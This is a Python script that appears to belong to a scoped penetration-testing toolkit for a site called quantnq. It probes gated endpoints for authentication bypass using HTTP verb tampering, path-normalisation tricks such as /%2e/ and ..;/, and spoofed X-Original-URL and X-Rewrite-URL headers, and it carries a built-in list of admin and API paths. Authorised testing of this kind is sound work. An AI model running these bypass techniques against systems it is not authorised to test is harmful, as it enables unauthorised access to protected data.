#!/usr/bin/env python3
"""authbypass_probe.py - UNAUTHENTICATED access-control bypass battery.

quantnq's whole security model is "no access-ID, no access." This probe is the adversary for that
model: given endpoints that are correctly GATED to an anonymous client, it tries the standard
access-control bypass tricks and asks one deterministic question - did a trick make the server
hand real gated content to an anonymous requester?

Oracle (reused verbatim from authz_probe):
  * calibrate() -> soft-404 fingerprint for this host.
  * An endpoint is GATED if anon GET is 3xx->login, 401/403, or returns the SPA login *shell*.
  * A bypass is CONFIRMED only if a variant returns a REAL non-shell exposure (200 + real file/API
    body, or a sensitive content-type) where the baseline was gated. Reflection/shell/soft-404 are
    never findings.

Bypass techniques (all read-only GET/HEAD-class, no data written):
  verb    HEAD / OPTIONS / POST / PUT / PATCH / TRACE on the gated path
  path    trailing dot/slash, //, /./, /%2e/, ..;/, case flip, ;.json, .json/.css suffix
  header  X-Original-URL / X-Rewrite-URL / X-Forwarded-For/Host / Referer set to the gated path
          (the classic reverse-proxy / edge ACL bypass; uses inject.py's header surface)

Scope-gated. Stops at PROOF (gated content reached). Does not download/exfiltrate beyond the proof
snippet; full impact is human-gated.
"""
from __future__ import annotations
import sys, json, argparse, pathlib, urllib.parse
sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent))
from runner import Scope
from authz_probe import in_scope, do, new_jar, calibrate, looks_real, snip
from inject import build_injections

VERBS = ["HEAD", "OPTIONS", "POST", "PUT", "PATCH", "TRACE"]


def _is_shell(body, ctype):
    return ("text/html" in ctype) and (b"_next/static" in body or b"/_next/" in body
                                        or b"ng-version" in body or b"<app-root" in body)


def _is_login_redirect(status, headers):
    loc = (headers.get("Location") or headers.get("location") or "").lower()
    return 300 <= status < 400 and ("login" in loc or "signin" in loc or "auth" in loc or "unlock" in loc)


def _real_exposure(status, body, ctype, url, fp):
    """True iff this response is real gated content (same test authz_probe uses to flag a file)."""
    if _is_shell(body, ctype):
        return False
    if not looks_real(status, body, fp):
        return False
    sens = url.lower().endswith((".key", ".pem", ".env", ".sql", ".bak", ".kdbx")) or "octet-stream" in ctype
    is_file = any(x in ctype for x in ("pdf", "octet-stream", "zip", "json", "yaml",
                                       "text/plain", "markdown", "msword", "excel", "x-"))
    return bool(sens or is_file or (status == 200 and len(body) >= 64 and "text/html" not in ctype))


def _path_variants(u):
    p = urllib.parse.urlsplit(u)
    path = p.path
    cands = [path.rstrip("/") + "/.", path.rstrip("/") + "//", path + "/./",
             path.rstrip("/") + "/%2e/", path.rstrip("/") + "..;/", path + ";",
             path + ".json", path + ".css", path.rstrip("/") + "%20",
             path.upper() if path.lower() != path.upper() else path + "/"]
    out = []
    for np in cands:
        out.append(urllib.parse.urlunsplit((p.scheme, p.netloc, np, p.query, p.fragment)))
    return list(dict.fromkeys(out))


def classify_baseline(cj, u, fp):
    st, hdr, body, _ = do(cj, "GET", u, follow=False)
    ctype = (hdr.get("Content-Type") or hdr.get("content-type") or "").lower()
    if _real_exposure(st, body, ctype, u, fp):
        return "open", (st, ctype, len(body))          # already reachable anon (not a bypass finding)
    if _is_login_redirect(st, hdr) or st in (401, 403) or _is_shell(body, ctype):
        return "gated", (st, ctype, len(body))
    return "other", (st, ctype, len(body))


def try_bypasses(cj, u, fp):
    hits = []
    # verb tampering
    for v in VERBS:
        st, hdr, body, _ = do(cj, v, u, follow=False)
        ctype = (hdr.get("Content-Type") or hdr.get("content-type") or "").lower()
        if _real_exposure(st, body, ctype, u, fp):
            hits.append({"technique": "verb", "detail": v, "status": st, "ctype": ctype,
                         "proof_request": f"{v} {u}", "sample": snip(body)})
    # path normalization tricks
    for nu in _path_variants(u):
        st, hdr, body, _ = do(cj, "GET", nu, follow=False)
        ctype = (hdr.get("Content-Type") or hdr.get("content-type") or "").lower()
        if _real_exposure(st, body, ctype, nu, fp):
            hits.append({"technique": "path", "detail": nu, "status": st, "ctype": ctype,
                         "proof_request": f"GET {nu}", "sample": snip(body)})
    # header-based edge/proxy ACL bypass (inject.py header surface), payload = the gated path
    path = urllib.parse.urlsplit(u).path
    for r in build_injections(u, path, surfaces=("header",)):
        st, hdr, body, _ = do(cj, "GET", r.url, headers=r.headers, follow=False)
        ctype = (hdr.get("Content-Type") or hdr.get("content-type") or "").lower()
        if _real_exposure(st, body, ctype, u, fp):
            hits.append({"technique": "header", "detail": f"{r.location}: {path}", "status": st,
                         "ctype": ctype, "proof_request": r.describe(), "sample": snip(body)})
    return hits


def run(base, seeds, assets, fp_cache=None):
    host = urllib.parse.urlparse(base).hostname
    if host and not in_scope(assets, host):
        print(f"REFUSED: {host} not in scope")
        return []
    cj = new_jar()
    fp = calibrate(cj, base)
    findings, gated_n, open_n = [], 0, 0
    for s in seeds:
        u = base.rstrip("/") + (s if s.startswith("/") else "/" + s)
        kind, meta = classify_baseline(cj, u, fp)
        if kind == "open":
            open_n += 1
            print(f"[authbypass] {u} -> already anon-reachable (pre-existing exposure, not a bypass)")
            continue
        if kind != "gated":
            continue
        gated_n += 1
        hits = try_bypasses(cj, u, fp)
        for h in hits:
            findings.append({
                "class": "auth-bypass", "severity": "high", "endpoint": u,
                "baseline": {"status": meta[0], "ctype": meta[1]},
                "validated_by": "gated-to-anon baseline bypassed: variant returned real content to an unauthenticated client",
                "confirmed": True, **h,
            })
            print(f"[authbypass] CONFIRMED bypass {u} via {h['technique']}:{h['detail']} -> {h['status']} {h['ctype']}")
    print(f"[authbypass] {gated_n} gated endpoint(s) tested, {open_n} already open, {len(findings)} bypass(es)")
    return findings


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", default="https://www.quantnq.com")
    ap.add_argument("--scope", default="scope.json")
    ap.add_argument("--seeds", default=None, help="file of newline paths; else a built-in gated-path list")
    ap.add_argument("--out", default="authbypass_findings.json")
    a = ap.parse_args()
    scope = Scope(json.loads(pathlib.Path(a.scope).read_text()))
    if a.seeds:
        seeds = [l.strip() for l in pathlib.Path(a.seeds).read_text().splitlines()
                 if l.strip() and not l.startswith("#")]
    else:
        seeds = ["/admin/access/", "/admin/", "/papers/unlock/", "/papers/", "/account/",
                 "/dashboard/", "/api/auth/papers/unlock/", "/api/auth/login", "/api/user",
                 "/api/me", "/api/papers", "/settings/", "/api/account"]
    f = run(a.base, seeds, scope.assets)
    pathlib.Path(a.out).write_text(json.dumps(f, indent=2))
    print(f"[authbypass] {len(f)} finding(s) -> {a.out}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
